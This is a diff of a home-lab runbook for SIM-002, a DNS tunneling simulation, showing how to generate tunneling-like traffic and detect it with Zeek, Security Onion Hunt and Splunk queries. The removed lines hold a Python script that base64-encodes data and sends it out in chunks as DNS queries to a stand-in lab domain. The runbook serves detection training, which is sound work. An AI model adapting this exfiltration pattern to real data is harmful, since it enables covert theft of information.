@@ -2,181 +2,188 @@
 
 ## 1. Prerequisites
 
-Before starting, verify the following systems are online:
+Before starting, verify the following systems are online and healthy:
 
-- **Kali Linux (10.0.0.30)**
+- **Kali Linux**
   - Internet access through pfSense
-  - Python installed
+  - DNS resolution functional
   - `dnsutils` installed:
     ```
     sudo apt install dnsutils -y
     ```
 
-- **Security Onion (10.0.0.20)**
-  - Zeek running
-  - Suricata running
-  - DNS traffic visible
+- **Security Onion**
+  - Zeek running and healthy
+  - Monitor interface capturing traffic
+  - SOC UI accessible
 
-- **Splunk Enterprise (10.0.0.60)**
-  - Ingesting Zeek DNS logs
-  - Index for Zeek available
+- **pfSense**
+  - Acting as the default gateway
+  - DNS resolver enabled
+  - All endpoint traffic routed through firewall
 
-- **pfSense (10.0.0.1)**
-  - All traffic routed through firewall
-
-✅ Validate in Splunk:
-```spl
-index=* sourcetype=zeek:dns | head 5
-```
-
----
-
-## 2. Start a Fake DNS Exfiltration Domain (Simulation Only)
-
-On **Kali Linux**:
-
-```bash
-sudo nano dns_exfil.py
-```
-
-Paste:
-```python
-import base64
-import dns.resolver
-import time
-
-test_data = "ThisIsSimulatedExfilDataForSIM002"
-encoded = base64.b64encode(test_data.encode()).decode()
-
-for i in range(0, len(encoded), 10):
-    chunk = encoded[i:i+10]
-    domain = f"{chunk}.sim002.lab"
-    try:
-        dns.resolver.resolve(domain, "A")
-    except:
-        pass
-    time.sleep(1)
-```
-Save and Exit.
-
----
-
-## 3. Execute the DNS Tunneling Simulation
-
-On Kali Linux:
-```bash
-python3 dns_exfil.py
-```
-
-**This generates:**
-- ✅ High-frequency DNS queries
-- ✅ Long encoded subdomains
-- ✅ Suspicious entropy patterns
-
----
-
-## 4. Validate DNS Telemetry in Security Onion (Zeek)
-
+### Health Check (Security Onion)
 On Security Onion:
+```bash
+sudo so-status
+```
+
+Ensure:
+- `so-zeek` = running
+- Elasticsearch and SOC services = running
+
+---
+
+## 2. Generate Baseline DNS Traffic (Normal Behavior)
+
+On **Kali Linux**, generate standard DNS queries:
+```bash
+nslookup example.com
+nslookup google.com
+nslookup github.com
+```
+Optional short burst:
+```bash
+for i in {1..5}; do nslookup example.com; done
+```
+
+Purpose:
+- Establish normal DNS query patterns
+- Validate DNS resolution path
+
+---
+
+## 3. Verify DNS Capture at the Sensor (Zeek)
+
+On **Security Onion**, confirm DNS logs are being written:
+```bash
+sudo tail -f /nsm/zeek/logs/current/dns.log
+```
+
+Expected:
+- DNS queries from Kali
+- Human-readable domain names
+- `NOERROR` responses
+
+📸 **Screenshot:**  
+`sim002-zeek-dns-baseline-log.png`
+
+---
+
+## 4. Verify Baseline DNS Telemetry in Hunt
+
+In **Security Onion → SOC → Hunt**:
+
+- Time range: **Last 24 hours**
+- Search (KQL):
 ```so
-sudo tail -f /nsm/sensor_data/*/zeek/dns.log
+event.dataset: "zeek.dns"
 ```
 
-You should see:
-- Repeated queries
+Expected:
+- DNS events visible
+- Source IP = Kali
+- Normal domain lengths
+
+📸 **Screenshot:**  
+`sim002-hunt-zeek-dns-baseline.png`
+
+---
+
+## 5. Generate Suspicious DNS Traffic (Tunneling-Like Behavior)
+
+On **Kali Linux**, generate high-frequency DNS queries with long, randomized subdomains:
+```bash
+for i in {1..50}; do nslookup $(head /dev/urandom | tr -dc a-z | head -c 25).example.com; done
+```
+
+This simulates:
+- Abnormally long DNS queries
+- High query frequency
+- Patterns consistent with DNS tunneling behavior
+
+---
+
+## 6. Observe Suspicious DNS in Zeek Logs
+
+On **Security Onion**:
+```bash
+sudo tail -f /nsm/zeek/logs/current/dns.log
+```
+
+Expected:
 - Long subdomain strings
-- Base64-looking traffic
-- Rapid frequency
+- Repeated base domain
+- Rapid query generation
 
-***✅ Capture timestamp.***
+📸 **Screenshot:**  
+`sim002-zeek-dns-suspicious-log.png`
 
 ---
 
-## 5. Validate DNS Traffic in Splunk
+## 7. Analyze Suspicious DNS in Hunt
 
-Run:
-```spl
-sourcetype=zeek:dns
-(query="*.sim002.lab")
-| table _time, id.orig_h, id.resp_h, query
-| sort - _time
+In **Security Onion → Hunt**:
+
+Search (KQL):
+```so
+event.dataset: "zeek.dns"
+```
+Optional refinement:
+```so
+event.dataset: "zeek.dns" and dns.question.name:*
 ```
 
-✅ Expected:
-- Long encoded subdomains
-- High volume queries
-- Repeated patterns
+Look for:
+- Long or random-looking subdomains
+- Repeated query patterns
+- Increased frequency
+
+📸 **Screenshot:**  
+`sim002-hunt-zeek-dns-suspicious.png`
 
 ---
 
-## 6. Detect DNS Tunneling by Entropy & Length
-```spl
-sourcetype=zeek:dns
-| eval qlen=len(query)
-| where qlen > 50
-| table _time, id.orig_h, query, qlen
-| sort - qlen
-```
+## 8. Analyst Interpretation
 
-✅ Expected:
-- Abnormally large DNS queries
-- High entropy strings
+At this stage, the analyst should be able to distinguish:
 
----
+- **Normal DNS**
+  - Short, human-readable domains
+  - Low frequency
 
-## 7. Correlate Suspicious DNS Behavior
-```spl
-sourcetype=zeek:dns
-| eval qlen=len(query)
-| where qlen > 50
-| eval simulation_id="SIM-002"
-| eval symbolic_id="LAB-SIM-002-DNS-TUNNEL"
-| table _time, id.orig_h, query, qlen, simulation_id, symbolic_id
-| sort - _time
-```
+- **Suspicious DNS**
+  - Long, high-entropy subdomains
+  - Repeated base domains
+  - Elevated query volume
 
-***✅ This becomes your primary detection correlation query.***
-
----
-
-## 8. Configure Splunk Alert (LAB-SIM-002-DNS-TUNNEL)
-
-Alert Settings:
-- Type: Scheduled
-- Run every: 5 minutes
-- Time window: Last 15 minutes
-- Trigger: If results ≥ 1
-- Severity: High
-
-✅ Output Fields:
-- id.orig_h
-- query
-- qlen
-- simulation_id
-- symbolic_id
+This satisfies the detection objective for DNS tunneling–style behavior.
 
 ---
 
 ## 9. Save Screenshots
 
-Store in:
-simulations/SIM-002-DNS-Tunneling/screenshots/
+Store all evidence in:  
+`simulations/SIM-002-DNS-Tunneling/screenshots/`
 
-Required:
-- sim002-zeek-dns-log.png
-- sim002-splunk-dns-search.png
-- sim002-splunk-correlation.png
-- sim002-alert-config.png
-- sim002-alert-fired.png
+Required screenshots:
+- `sim002-zeek-dns-baseline-log.png`
+- `sim002-hunt-zeek-dns-baseline.png`
+- `sim002-zeek-dns-suspicious-log.png`
+- `sim002-hunt-zeek-dns-suspicious.png`
 
 ---
 
-10. Mark Simulation Completion
+## 10. Mark Simulation Completion
 
-Update SIM-002 README.md checklist:
-- [x] Steps executed
-- [x] Logs captured
-- [x] Queries validated
-- [x] Alert firing
-- [x] Screenshots saved
-- [x] Detection matrix updated
+Update SIM-002 checklist:
+- [x] Baseline DNS generated
+- [x] Suspicious DNS generated
+- [x] Zeek DNS logs captured
+- [x] Hunt telemetry validated
+- [x] Evidence screenshots saved
+- [x] Simulation marked **Validated**
+
+
+
+
